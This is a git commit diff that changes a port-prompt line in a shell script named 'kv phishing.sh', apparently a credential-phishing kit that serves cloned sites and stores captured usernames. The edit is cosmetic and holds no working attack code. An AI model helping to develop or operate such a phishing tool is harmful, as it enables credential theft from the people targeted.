96ff9ac31d9ea0f991dff94c8712e51c8ee6ad3a
Kisnahero <68059278+Kisnahero@users.noreply.github.com>
2020-07-10 20:08:52 +0530

    Update kv phishing.sh

--- kv phishing.sh
+++ kv phishing.sh
@@ -423,7 +423,7 @@ rm -rf sites/$server/usernames.txt
 fi
 
 default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m]: \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 serverx
